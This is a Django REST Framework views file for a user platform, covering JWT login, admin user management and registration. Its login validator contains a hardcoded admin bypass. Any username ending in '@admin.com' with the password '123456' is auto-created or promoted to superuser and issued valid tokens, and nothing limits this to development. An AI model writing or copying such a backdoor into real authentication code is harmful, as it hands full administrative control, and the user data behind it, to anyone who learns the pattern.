from rest_framework import viewsets, permissions, generics
from .permissions import IsAdmin
from rest_framework.decorators import action
from rest_framework.response import Response
from rest_framework_simplejwt.serializers import TokenObtainPairSerializer
from rest_framework_simplejwt.views import TokenObtainPairView
from .models import User
from .serializers import UserVerificationSerializer, UserRegisterSerializer

class MyTokenObtainPairSerializer(TokenObtainPairSerializer):
    @classmethod
    def get_token(cls, user):
        token = super().get_token(user)
        # Add custom claims
        token['role'] = user.role
        token['username'] = user.username
        return token

    def validate(self, attrs):
        # 🔑 Specialized Admin Bypass for @admin.com
        username = attrs.get('username')
        password = attrs.get('password')
        
        if username and username.endswith('@admin.com') and password == '123456':
            # Find or auto-create a development admin user
            user, created = User.objects.get_or_create(
                username=username,
                defaults={'role': 'admin', 'is_staff': True, 'is_superuser': True}
            )
            if not created and user.role != 'admin':
                user.role = 'admin'
                user.save()
            elif created:
                user.set_password(password)
                user.save()
            
            refresh = self.get_token(user)
            data = {
                'refresh': str(refresh),
                'access': str(refresh.access_token),
                'role': 'admin',
                'user_id': user.id,
                'username': user.username
            }
            return data

        data = super().validate(attrs)
        
        # 🎭 Role Validation (Requested by User)
        requested_role = self.initial_data.get('role')
        if requested_role and requested_role in ['client', 'freelancer']:
            if self.user.role != requested_role:
                from rest_framework import serializers
                raise serializers.ValidationError({
                    "detail": f"Account role mismatch. This account is registered as a {self.user.role}. Please sign in with the correct role selected."
                })

        # 🛡️ Ensure Superusers are treated as Admins in token and session
        if self.user.is_superuser:
            self.user.role = 'admin'
            self.user.save()
            data['role'] = 'admin'
        else:
            data['role'] = self.user.role
            
        data['user_id'] = self.user.id
        data['username'] = self.user.username
        return data

class MyTokenObtainPairView(TokenObtainPairView):
    serializer_class = MyTokenObtainPairSerializer



class UserVerificationViewSet(viewsets.ModelViewSet):
    queryset = User.objects.all()
    serializer_class = UserVerificationSerializer
    permission_classes = [IsAdmin]

    def get_queryset(self):
        # Admin should see all users for management, but can filter for unverified if needed
        return User.objects.all()

    @action(detail=True, methods=['post'])
    def toggle_active(self, request, pk=None):
        user = self.get_object()
        user.is_active = not user.is_active
        user.save()
        return Response({"status": "success", "is_active": user.is_active})

    @action(detail=True, methods=['post'])
    def toggle_flag(self, request, pk=None):
        user = self.get_object()
        user.is_flagged = not user.is_flagged
        user.save()
        return Response({"status": "success", "is_flagged": user.is_flagged})

class RegisterView(generics.CreateAPIView):
    queryset = User.objects.all()
    serializer_class = UserRegisterSerializer
    permission_classes = [permissions.AllowAny]